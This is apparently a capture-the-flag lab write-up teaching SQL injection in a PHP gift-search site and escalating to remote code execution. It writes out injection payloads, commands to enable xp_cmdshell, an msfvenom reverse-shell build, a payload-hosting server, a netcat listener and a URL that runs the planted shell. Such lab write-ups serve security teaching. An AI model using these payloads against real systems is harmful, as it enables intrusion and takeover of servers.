# Day 10
## SQL Injection

Today we will be taking a look at basic SQL injections and how to exploit a SQL vulnerbaility. Our learning objectives for today:

- Learn to understand and identify SQL injection vulnerabilites
- Exploit stacked queries to turn SQL injection into remote code execution (RCE)
- Restore the website

## SQL Overview

SQL (structured query language) is important for working with relational databases and building dynamic websites. SQL provides a rigid way to ```query```, ```insert```, ```update```, and ```delete``` the data stored in these tables. SQL syntax includes keywords like: 

- ```SELECT```
- ```FROM```
- ```WHERE```
- ```JOIN```

## PHP Overview

PHP is a general-purpose scriptig language that is used often in web development. It helps devlopers create dynamic and interactive webties by generating HTML conent on the server and delivering it to a client's web browser. PHP can perform server-side tasks, such as connecting to databases, executing SQL queries, processing form data, and dynamically generating web content.

The most common way for PHP to connect to SQL databases is using the PHP Data Objects (PDO) or specific server drivers. For example, if we want out PHP script to fetch any red colored ornaments from the ```tbl_ornaments``` or we would write the following lines:

```$query = "SELECT * FROM tbl_ornaments WHERE color = 'Red'";```
```$result = sqlsrv_query($conn, $query)```

First, we saved our SQL query into the variable ```$query```. Next, we use the ```sqlserv_query()``` function to execute the query by passing it to a database connection object ```$conn```. The ```$result``` variable holds the outcome of the SQL query.

## User Input

Dynamic querires are an easy way to adjust our queries in PHP based on the user input. A common way to take in user-supplied data in web applications is through ```GET``` parameters. These are often appended to the URL and can be accessed through PHP. Foe example, we can create a simple search form for users to specify the color of ornament they want. After the form is submitted, the website makes a ```GET``` request to the search results page, including the user's input. PHP can access the input as a ```GET parameter``` and generate a query based upon it.

```$color = $_GET['color'];```

```$query = "SELECT * FROM tbl_ornaments WHERE color = '$color'";```
```$result = sqlsrv_query($conn, $query)```

The above set the ```$color``` variable to the variable retrieved from the ```color``` URL parameter, which is then passed into the ```$query``` string. 

## SQL Injection

A SQL injection is an attack technique that exploits how web applications handle user input. Attackers can inject malicious SQL statements into web applications input tifleds in order to access their desired data. This can be catastrophic as attackers can control the data functions performed, leading to potentially exposing sensitive user data and causing data breaches.

SQL injections are featured on the ```OWASP Top 10``` list of critical web applications risks.

For example, taking the code we previously looked at:

```$color = $_GET['color'];```

```$query = "SELECT * FROM tbl_ornaments WHERE color = '$color'";```
```$result = sqlsrv_query($conn, $query)```

An attacker coouyld hypothetically input ```' OR 1=1 --'``` as the input parameter, making the query look like the following:

```SELECT * FROM tbl_ornaments WHERE color = '' OR 1=1 --'```

We can break the above down in more detail:

- ```' OR``` allows for multiple conditions. This appends a second ```WHERE``` condition in the query
- ```1=1``` follows the ```OR``` operator and always evaluates as true
- ```--``` is a comment in SQL and tells the server to ignore anything after it. Attackers use it often because it nullifies the rest of the query and any additional conditions or syntax are ignored/

The condtion ```where color = ''``` is empty, however ```OR 1=1``` is true, therefore the entire where condition is true for each and every row in the table. This query would in theory return every single row.

## Stacked Queries

Stacked queries are used to to terminate the orignal query, and execute additional SQL commands in one statement. Inserting a semicolon signifies one statement's conclusion and another's commencement. For example, using the previous example, an attacker could insert false data into the database:

```' ; INSERT INTO tbl_ornaments (elf_id, color, category, material, price) VALUES (109, 'Evil Red', 'Broken Candy Cane', 'Coal, 99.99)```

This would terminate the intende SQL query and append the above to the end of the orignal, which would insert the included malicious data. 

## Testing for SQL Injections

We are going to be testing a website to identify a potential SQL injection vulnerability. First, we will visit our website and try to understand the functionality of it. On the ```Gift Seach``` tabe we can see a form with a drop down menu, check boxes, and a slider. 

![Alt text](/Advent%20of%20Cyber%202023/Resources/giftsearch.png)

We notice in the URL that when we make our selection on this form, the PHP takes in our three parameters ```age```, ```interests```, and ```budget```.


![Alt text](/Advent%20of%20Cyber%202023/Resources/giftsearchURL.png)

Attackers like to use single quotes (') and double quotes(") to manipulate SQL queries in hopes of getting an error message. This allows them to understand the underlying database. We can modify the above URL by adding a single quote into the ```age``` parameter. We get the following error message:

![Alt text](/Advent%20of%20Cyber%202023/Resources/giftsearcherror.png)

We can imagine the underlying PHP looks something like this:

```$ age = $_GET['age']```

```$interests = $_GET['interests']```

```$budget = $_GET['budget']```

```sql = "SELECT name FROM gifts WHERE age = '$age' AND interests = '$interests' AND budget <= '$budget'```

We can attempt to leverage the ```' OR 1=1 -- ``` payload we looked at earlier in order to bypass the intended filter:

```https://<IP_ADDRESS>/giftresults.php?age=' OR 1=1 --```

Success! We are returned with a list of all the gifts in the database:

![Alt text](/Advent%20of%20Cyber%202023/Resources/giftsearchreturn.png)

## Calling Stored Procedures

Stacked querires can be used to called stored procedures, or functions within a databse management system. A MS SQL Server stored procedure called ```xp_cmdshell``` allows for executing operating system calls. It allows SQL Server to interacts directly with the host OS command shell. It is disabled by default on production servers. We can manually enable ```xp_cmdshell``` in SQL Server through ```EXEC``` or execute queries. However, a user must have the ```ALTER SETTINGS``` server-level permissions. We can attempt to enable ```xp_cmdshell``` in hopes of a misconfiguration on the server:

```EXEC sp_configure 'show advanced options', 1;```

```RECONFIGURE;```

```EXEC sp_configure `xp_cmdshell', 1;``

```RECONFIGURE```

- First, we enabled the advanced configuration optiosn with ```show adanced options``` and setting it to ```1```
- Next, we saved the changes to the running configuration using ```RECONFIGURE```
- Lastly, we enabled the ```xp_cmdshell``` by setting it to ```1``` and saving it to the current running config. 

We can append the above to the URL:

![Alt text](/Advent%20of%20Cyber%202023/Resources/stackedquery.png)

However, we do not get any returned output. Therefore, we are left in the dark as far as if our query worked or not. We can validate if our approach worked in other ways, however.

## Remote Code Execution

We can see if we have RCE by attempting to execute ```certutil.exe``` on the target machine. It is a binary signed by Microsoft that allows us to make HTTP/s connections. We can use it to make an HTTP request to download a file from the web server to confirm that our command was sent.

We can create a payload using ```MSFvenom`` which is a command-line payload generation tool. We can use this to make a reverse shell connection back to out Kali machine. Our command for his is the following:

```msfvenom -p windows/x64/shell_reverse_tcp LHOST=<OUR_IP_ADDRESS> LPORT=4444 -f exe -o reverse.exe```

Now that we have our ```reverse.exe```, we can establish a reverse TCP connection to our machine over port ```4444```. We will create a HTTP server on our machine using Python to host the file:

```python 3 -m http.server 8000```

We can now use our stacked query to call ```xp_cmdshell``` and execute ```certutil.exe``` to download our payload from our hosted web server:

![Alt text](/Advent%20of%20Cyber%202023/Resources/stackedquery2.png)

In the above query, we downloaded the reverse shell payload off our hosted HTTP server and saved it on the target machine in the ```C:\Windows\Temp``` directory.

We can see the output of our request on our HTTP server:

![Alt text](/Advent%20of%20Cyber%202023/Resources/httprequest.png)

Now, all we have to do is set up a listener to catch the reverse shell we planted on the target machine and then have the system execute the payload. We will use ```netcat``` to listen on our machine over port 4444.

```nc -lnvp 4444```

We can run one final stacked query to execute the reverse shell we saved in the ```C:\Windows\Temp``` directory:

```http://10.10.255.250/giftresults.php?age='; EXEC xp_cmdshell 'C:\Windows\Temp\reverse.exe'; --```

Looking at our ```netcat``` listener, we can see that we caught the shell and have a connection

![Alt text](/Advent%20of%20Cyber%202023/Resources/netcat1.png)

Now, we are free to navigate through the directories and find information on this website. We can find a couple files on the Administrator's desktop that will help us find a couple of flags used to complete the room!

## Conclusion

Today, we used a variety of tools to perform a succesful SQL injection. We were able to craft a payload for a reverse shell, plant it on our target system, and catch the shell in order to gain remote code execution.